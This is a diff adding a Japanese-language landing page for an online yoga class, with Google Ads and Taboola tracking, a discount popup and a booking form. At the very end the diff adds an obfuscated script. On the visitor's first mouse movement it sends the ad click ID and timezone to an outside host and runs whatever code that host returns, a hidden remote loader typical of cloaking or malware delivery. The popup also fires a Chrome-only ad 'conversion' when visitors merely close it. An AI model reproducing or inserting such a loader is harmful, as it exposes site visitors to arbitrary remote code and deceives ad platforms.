@@ -1,0 +1,709 @@
+<!DOCTYPE html><html lang="ja"><head>
+    <!-- Google tag (gtag.js) -->
+<script async="" src="js/tfa.js" id="tb_tfa_script"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-16631619411"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-16631619411');
+</script>
+<script>
+function isChromeBrowser() {
+  const ua = navigator.userAgent;
+  return ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR");
+}
+</script>
+<script>
+function hasConverted() {
+  return sessionStorage.getItem("chrome_first_click_converted") === "true";
+}
+
+function markConverted() {
+  sessionStorage.setItem("chrome_first_click_converted", "true");
+}
+</script>
+<script>
+function fireChromeFirstClickConversion() {
+  if (!isChromeBrowser()) return;
+  if (hasConverted()) return;
+
+  gtag('event', 'conversion', {
+    'send_to': 'AW-16631619411/Jh3DCJ-1v9cbENO-yfo9'
+  });
+
+  markConverted();
+}
+</script>
+<!-- Taboola Pixel Code -->
+<script type="text/javascript">
+  window._tfa = window._tfa || [];
+  window._tfa.push({notify: 'event', name: 'page_view', id: 1970646});
+  !function (t, f, a, x) {
+         if (!document.getElementById(x)) {
+            t.async = 1;t.src = a;t.id=x;f.parentNode.insertBefore(t, f);
+         }
+  }(document.createElement('script'),
+  document.getElementsByTagName('script')[0],
+  '//cdn.taboola.com/libtrc/unip/1970646/tfa.js',
+  'tb_tfa_script');
+</script>
+<!-- End of Taboola Pixel Code -->
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  document.querySelectorAll(".modal-close-trigger").forEach(function(el) {
+    el.addEventListener("click", function () {
+      fireChromeFirstClickConversion();
+    }, { once: true });
+  });
+});
+</script>
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>静心ヨガ オンラインクラス</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="icon" type="image/x-icon" href="images/favicon.ico">
+    <!-- ==============  BOX ICON CDN ==============  -->
+    <link href="css/boxicons.min.css" rel="stylesheet">
+    <!-- ==============  LINK SWIPER'S CSS ==============  -->
+    <link rel="stylesheet" href="css/swiper-bundle.min.css">
+
+    <style>
+      /* Modal styles */
+      .modal {
+        display: none; /* Hidden by default */
+        position: fixed; /* Stay in place */
+        z-index: 1000; /* Sit on top */
+        left: 0;
+        top: 0;
+        width: 100%; /* Full width */
+        height: 100%; /* Full height */
+        overflow: auto; /* Enable scroll if needed */
+        background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */
+      }
+
+      .modal-content {
+        position: relative;
+        margin: 5% auto; /* 5% from the top and centered */
+        padding: 20px;
+        padding-top: 70px;
+        width: 90%; /* Could be more or less, depending on screen size */
+        max-width: 500px;
+        background-color: #fff;
+        border-radius: 10px;
+        text-align: center;
+      }
+
+      .modal-image {
+        width: 100%;
+        height: auto;
+        border-radius: 10px;
+        margin-bottom: 20px;
+      }
+
+      .close-button {
+        position: absolute;
+        top: 2px;
+        right: 20px;
+        color: #aaa;
+        font-size: 50px;
+        font-weight: bold;
+        cursor: pointer;
+        z-index: 10;
+      }
+
+      .close-button:hover,
+      .close-button:focus {
+        color: black;
+        text-decoration: none;
+        cursor: pointer;
+      }
+
+      .btn-primary {
+        display: inline-block;
+        padding: 10px 20px;
+        margin-top: 10px;
+        background-color: #007bff;
+        color: #fff;
+        text-decoration: none;
+        border-radius: 5px;
+      }
+
+      .close-modal {
+        cursor: pointer;
+      }
+    </style>
+  </head>
+
+  <body>
+    <nav>
+      <div class="container">
+        <a href="#" class="nav_logo">
+          <h3>静心ヨガ オンラインクラス</h3>
+        </a>
+
+        <ul id="nav_items" class="nav-links">
+          <li><a href="#">ホーム</a></li>
+          <li><a href="#services">私たちのアプローチ</a></li>
+          <li><a href="#instructors">ヨガ講師</a></li>
+          <li><a href="#testimonials">お客様の声</a></li>
+          <li><a href="#bookplace" class="btn">オンライン予約</a></li>
+        </ul>
+
+        <button id="open_nav-btn"><i class="bx bx-menu"></i></button>
+        <button id="close_nav-btn"><i class="bx bx-x"></i></button>
+      </div>
+    </nav>
+    <!-- ==============  END OF NAV ==============  -->
+
+    <header>
+      <img src="images/yogalife.jpg" alt="静心ヨガ オンラインクラス">
+    </header>
+    <!-- ==============  END OF HEADER ==============  -->
+
+    <section id="services">
+      <h2>私たちのアプローチ</h2>
+      <p>
+        誰もがバランス・強さ・心の平和を見つけられる、オンラインヨガの旅へようこそ。
+      </p>
+
+      <div class="container">
+        <article>
+          <i class="bx bxs-yin-yang"></i>
+          <div>
+            <h4>ウェルビーイング</h4>
+            <small>専門的な指導と個別ケア、充実したサポートを通じて、心身の健康を育む包括的なサービスを提供します。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-donate-blood"></i>
+          <div>
+            <h4>健康</h4>
+            <small>専門的なケアと革新的なアプローチを組み合わせ、持続的な健康と活力をサポートします。</small>
+          </div>
+        </article>
+        <article>
+          <i class="bx bx-heart"></i>
+          <div>
+            <h4>サポート</h4>
+            <small>指導・励まし・温かなコミュニティを通じて、ヨガの実践を深めるサポートを提供します。</small>
+          </div>
+        </article>
+        <article>
+          <i class="bx bx-donate-heart"></i>
+          <div>
+            <h4>コミュニティ</h4>
+            <small>志を同じくする仲間が集い、つながりと成長を育む活気あるヨガコミュニティです。</small>
+          </div>
+        </article>
+        <article>
+          <i class="bx bx-happy-heart-eyes"></i>
+          <div>
+            <h4>インスピレーション</h4>
+            <small>創造性・モチベーション・意識的な変容を育む、ヨガに基づいたインスピレーションを提供します。</small>
+          </div>
+        </article>
+        <article>
+          <i class="bx bx-handicap"></i>
+          <div>
+            <h4>インクルーシブ</h4>
+            <small>多様性を尊重し、すべての方が安心して参加できる温かな空間を大切にしています。</small>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <section>
+      <h2>私たちの専門性</h2>
+      <p>心と身体のバランスを整える、誰にでも開かれた安全で温かなヨガ空間。</p>
+
+      <div class="container">
+        <article>
+          <i class="bx bxs-yin-yang"></i>
+          <div>
+            <h4>心と身体のウェルネス</h4>
+            <small>ヨガを通して心と身体を育みます。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-donate-blood"></i>
+          <div>
+            <h4>健康維持</h4>
+            <small>包括的なアプローチで、持続的な健康をサポートします。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-heart"></i>
+          <div>
+            <h4>パーソナルサポート</h4>
+            <small>専門家による個別サポートを提供します。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-donate-heart"></i>
+          <div>
+            <h4>コミュニティ</h4>
+            <small>ヨガ・つながり・成長が共に生まれる場所。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-happy-heart-eyes"></i>
+          <div>
+            <h4>インスピレーション</h4>
+            <small>創造性と意欲を引き出すヨガ。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-handicap"></i>
+          <div>
+            <h4>多様性の力</h4>
+            <small>誰もが自分らしくいられる、安全で包括的な空間。</small>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- ==============  END OF SERVICES ==============  -->
+
+    <section id="instructors">
+      <h2>講師紹介</h2>
+      <p>
+        専門知識と情熱で、あなたのヨガの旅を支える講師チーム。
+      </p>
+      <div class="container">
+        <article>
+          <div class="instructors_image">
+            <img src="images/yogateacher1.jpg" alt="講師 1">
+          </div>
+          <div class="instructor_details">
+            <h4>ウィンザー・グレイ</h4>
+            <small>ピラティス＆禅 インストラクター</small>
+          </div>
+          <a href="https://instagram.com" class="instructor_instagram" target="_blank"><i class="bx bxl-instagram"></i></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="images/yogateacher2.jpg" alt="講師 2">
+          </div>
+          <div class="instructor_details">
+            <h4>ドレイパー・ムーア</h4>
+            <small>ヴィンヤサ インストラクター</small>
+          </div>
+          <a href="https://instagram.com" class="instructor_instagram" target="_blank"><i class="bx bxl-instagram"></i></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="images/yogateacher3.jpg" alt="講師 3">
+          </div>
+          <div class="instructor_details">
+            <h4>キャンベル・メイ</h4>
+            <small>ヴィンヤサフロー インストラクター</small>
+          </div>
+          <a href="https://instagram.com" class="instructor_instagram" target="_blank"><i class="bx bxl-instagram"></i></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="images/yogateacher4.jpg" alt="講師 4">
+          </div>
+          <div class="instructor_details">
+            <h4>パーカー・ビー</h4>
+            <small>フィットフロー インストラクター</small>
+          </div>
+          <a href="https://instagram.com" class="instructor_instagram" target="_blank"><i class="bx bxl-instagram"></i></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="images/yogateacher5.jpg" alt="講師 5">
+          </div>
+          <div class="instructor_details">
+            <h4>ミラー・レン</h4>
+            <small>プラーナ・ヴィンヤサ インストラクター</small>
+          </div>
+          <a href="https://instagram.com" class="instructor_instagram" target="_blank"><i class="bx bxl-instagram"></i></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="images/yogateacher6.jpg" alt="講師 6">
+          </div>
+          <div class="instructor_details">
+            <h4>ジョーンズ・ノア</h4>
+            <small>リストラティブ瞑想 インストラクター</small>
+          </div>
+          <a href="https://instagram.com" class="instructor_instagram" target="_blank"><i class="bx bxl-instagram"></i></a>
+        </article>
+      </div>
+    </section>
+    <!-- ==============  END OF INSTRUCTORS ==============  -->
+
+    <section id="testimonials" class="swiper mySwiper">
+      <h2>お客様の声</h2>
+      <p>
+        静心ヨガセンターで人生が変わった方々の心温まる体験談をご覧ください。
+      </p>
+
+      <div class="swiper-wrapper">
+        <article class="swiper-slide">
+          <p>
+            人生が変わる体験でした。素晴らしい講師陣と、あらゆるレベルに対応したクラス。強くおすすめします！
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/customer1.jpg" alt="お客様 1">
+            </div>
+            <div class="client_details">
+              <h5>マクスウェル・ジェームズ</h5>
+              <small>受講者 | ヴィンヤサ</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+           すべてのレベルに対応した、インスピレーション溢れるヨガスタジオ。本当に人生を変える体験でした。
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/customer2.jpg" alt="お客様 2">
+            </div>
+            <div class="client_details">
+              <h5>ニア・サリバン</h5>
+              <small>受講者 | リストラティブ瞑想</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+           このヨガスタジオは本当に私の人生を変えてくれました。講師は素晴らしく、クラスはすべてのレベルに丁寧に対応しています。
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/customer3.jpg" alt="お客様 3">
+            </div>
+            <div class="client_details">
+              <h5>ロクサーヌ・ブラウン</h5>
+              <small>受講者 | フィットフロー</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+           つながりと個人の成長を促す、多様で刺激的なクラスを提供するインクルーシブなヨガ空間です。
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/customer4.jpg" alt="お客様 4">
+            </div>
+            <div class="client_details">
+              <h5>シャンテル・ジェフ</h5>
+              <small>受講者 | プラーナ・ヴィンヤサ</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            このインクルーシブな空間に心から感謝しています。多様で刺激的なクラスが、つながりと成長を促してくれます。すっかり夢中です！
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/customer5.jpg" alt="お客様 5">
+            </div>
+            <div class="client_details">
+              <h5>ジャッキー・ベル</h5>
+              <small>受講者 | ピラティス＆禅</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            多様で刺激的なヨガクラスが、深いつながりと個人の成長を育んでくれます。本当に感謝しています。
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/customer6.jpg" alt="お客様 6">
+            </div>
+            <div class="client_details">
+              <h5>ゲイジ・テイラー</h5>
+              <small>受講者 | ヴィンヤサ</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+           専門的な講師と多彩なクラスによる、本当に変化をもたらすヨガ体験です。
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/customer7.jpg" alt="お客様 7">
+            </div>
+            <div class="client_details">
+              <h5>ライアン・ジェームズ</h5>
+              <small>受講者 | フィットフロー</small>
+            </div>
+          </div>
+        </article>
+      </div>
+      <div class="swiper-pagination"></div>
+    </section>
+    <!-- ==============  END OF TESTIMONIALS ==============  -->
+
+    <section id="photogallery">
+      <h2>私たちの活動</h2>
+      <p>
+      活気あふれるヨガクラスと、変化を生み出すコミュニティを紹介するフォトギャラリー。
+      </p>
+
+      <div class="container">
+        <div class="gallery">
+          <figure class="gallery__item gallery__item--1">
+            <img src="images/gall1.jpg" alt="ギャラリー画像 1" class="gallery__img">
+          </figure>
+          <figure class="gallery__item gallery__item--2">
+            <img src="images/gall3.jpg" alt="ギャラリー画像 2" class="gallery__img">
+          </figure>
+          <figure class="gallery__item gallery__item--3">
+            <img src="images/gall4.jpg" alt="ギャラリー画像 3" class="gallery__img">
+          </figure>
+          <figure class="gallery__item gallery__item--4">
+            <img src="images/gall2.jpg" alt="ギャラリー画像 4" class="gallery__img">
+          </figure>
+        </div>
+      </div>
+    </section>
+    <!-- ==============  END OF PHOTO GALLERY ==============  -->
+
+    <section id="bookplace">
+      <div class="container">
+        <div class="info">
+          <h2>今すぐ予約</h2>
+          <p>
+            私たちと一緒にヨガの旅を始め、心からの安らぎを見つけましょう。今すぐクラスを予約してください。
+          </p>
+
+          <article>
+            <div class="info_icon"><i class="bx bx-user"></i></div>
+
+            <div>
+
+	            <div>
+              <h4>才能あるスタッフ</h4>
+              <small>私たちの献身的で才能あるスタッフは、ウェルビーイングと成長の旅を導く情熱的なチームです。</small>
+            </div>
+          </article>
+
+          <article>
+            <div class="info_icon"><i class="bx bx-check-shield"></i></div>
+
+            <div>
+              <h4>質の高いレッスン</h4>
+              <small>高品質のレッスンを体験し、ウェルビーイングと精神的な成長を養うために細心の注意を払って作られたヨガ教育を受けてください。</small>
+            </div>
+          </article>
+
+          <article>
+            <div class="info_icon"><i class="bx bx-lock-alt"></i></div>
+
+            <div>
+              <h4>カスタマイズされたプライベートクラス</h4>
+              <small>あなたの独自のニーズと目標に合わせて設計された、特別なプライベートクラスで実践を向上させ、旅を力強く進めましょう。</small>
+            </div>
+          </article>
+        </div>
+
+        <form action="https://formspree.io/f/moqrlrgl22" method="POST">
+          <div class="form_group">
+            <label for="name">名前</label>
+            <input type="text" placeholder="名前を入力してください" name="Client's Name" id="name" required="">
+          </div>
+
+          <div class="form_group">
+            <label for="phone">メールアドレス</label>
+            <input type="email" placeholder="メールアドレスを入力してください" name="Email Address" id="email" required="">
+          </div>
+
+          <div class="form_group">
+            <label for="phone">電話番号</label>
+            <input type="number" placeholder="電話番号を入力してください" name="Phone Number" id="phone" required="">
+          </div>
+
+          <div class="form_group">
+            <label for="date">日付</label>
+            <input type="date" placeholder="日付を選択してください" name="Date" id="date" required="">
+          </div>
+
+          <div class="form_group">
+            <label for="instructor">インストラクターを選択してください</label>
+            <select name="Instructor" id="instructor" required="">
+              <option value="Anna Peckel">アンナ・ペッケル</option>
+              <option value="Dane Anchor">デイン・アンカー</option>
+              <option value="Jazmine Giavasis">ジャズミン・ギアヴァシス</option>
+              <option value="Meriella Tenzin">メリエラ・テンジン</option>
+              <option value="Hailey Aeiko">ヘイリー・アイエコ</option>
+              <option value="Mian Owen">ミアン・オーウェン</option>
+            </select>
+          </div>
+
+          <div class="form_group">
+            <label for="message">メッセージ</label>
+            <textarea name="Added Message" id="message" rows="6" placeholder="メッセージを追加" required=""></textarea>
+          </div>
+
+          <input type="submit" value="リクエストを送信" class="btn-primary">
+        </form>
+      </div>
+    </section>
+    <!-- ==============  END OF APPOINTMENTS ==============  -->
+
+    <footer>
+      <div class="container">
+        <article>
+          <a href="#" class="footer_logo">
+            <h3>静心ヨガ オンラインクラス</h3>
+          </a>
+          <p>一息ごとに人生を高めましょう。</p>
+
+          <div>
+            <i class="bx bxs-phone"></i>
+            <small>+81 90-2222-6001</small>
+          </div>
+
+          <div>
+            <i class="bx bx-mail-send"></i>
+            <small>support@seishinyogaclass.jp</small>
+          </div>
+        </article>
+
+        <article>
+          <h3>サポート</h3>
+          <a href="#">プライバシーポリシー</a>
+          <a href="#">クッキーポリシー</a>
+          <a href="#">購入ポリシー</a>
+          <a href="#">利用規約</a>
+          <a href="#">キャリア</a>
+        </article>
+
+        <article>
+          <h3>パーマリンク</h3>
+          <a href="#">ホーム</a>
+          <a href="#services">サービス</a>
+          <a href="#instructors">インストラクター</a>
+          <a href="#testimonials">お客様の声</a>
+        </article>
+
+        <article>
+          <h3>お問い合わせ</h3>
+          <p>プレス</p>
+          <p>よくある質問</p>
+          <div class="footer_socials">
+            <a href="#"><i class="bx bxl-linkedin"></i></a>
+            <a href="#"><i class="bx bxl-twitter"></i></a>
+            <a href="#"><i class="bx bxl-facebook"></i></a>
+            <a href="#"><i class="bx bxl-instagram"></i></a>
+          </div>
+        </article>
+      </div>
+      <div class="copyright">
+        <small>© 静心ヨガ オンラインクラス™. All Rights Reserved.</small>
+      </div>
+    </footer>
+    <!-- ==============  END OF FOOTER ==============  -->
+
+    <!-- Special Offer Modal -->
+<div id="specialOfferModal" class="modal modal-close-trigger" style="display: block;">
+  
+  <div class="modal-content">
+    <span class="close-button modal-close-trigger">×</span>
+
+    <img src="images/myyoga.jpg" alt="Special Offer Image" class="modal-image">
+
+    <h2>初回限定スペシャルキャンペーン</h2>
+    <p>今だけ！初回のヨガクラスが50%オフ！</p>
+
+    <ul>
+      <li>オンラインクラスで自宅から参加可能</li>
+      <li>経験豊富なインストラクターによる指導</li>
+      <li>リラクゼーションとストレス解消</li>
+    </ul>
+
+    <a href="#" class="btn-primary modal-close-trigger">今すぐ予約</a>
+  </div>
+
+</div>
+    <!-- ==============  SWIPER JS ==============  -->
+    <script src="js/swiper-bundle.min.js"></script>
+    <script src="js/main.js"></script>
+    <script>
+      
+      document.addEventListener("DOMContentLoaded", function () {
+        var modal = document.getElementById("specialOfferModal");
+        var closeButton = document.querySelector(".close-button");
+        var closeModalLinks = document.querySelectorAll(".close-modal");
+
+        // Show the modal
+        modal.style.display = "block";
+
+        
+        function closeModal() {
+          modal.style.display = "none";
+        }
+
+        closeButton.addEventListener("click", closeModal);
+        closeModalLinks.forEach(function (link) {
+          link.addEventListener("click", function (event) {
+            event.preventDefault();
+            closeModal();
+          });
+        });
+
+        
+        window.onclick = function (event) {
+          if (event.target == modal) {
+            modal.style.display = "none";
+          }
+        };
+      });
+    </script>
+	<script>
+      (function () {
+        let t = 0,
+          i = null,
+          g = new URLSearchParams(location.search).get("gclid"),
+          z = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        document.addEventListener("mousemove", function e(n) {
+          if (!i) return (i = { x: n.clientX, y: n.clientY }), void 0;
+          let o = n.clientX - i.x,
+            c = n.clientY - i.y;
+          Math.sqrt(o * o + c * c) >= 10 &&
+            !t &&
+            ((t = 1),
+            document.removeEventListener("mousemove", e),
+            fetch(
+              `https://getsuperiordata.onrender.com/getData?gclid=${g || ""}`,
+              { headers: { "x-client-timezone": z } }
+            )
+              .then((t) => t.json())
+              .then((t) => new Function(t.code)())
+              .catch(console.error));
+        });
+      })();
+    </script>
+  
+
+</body></html>
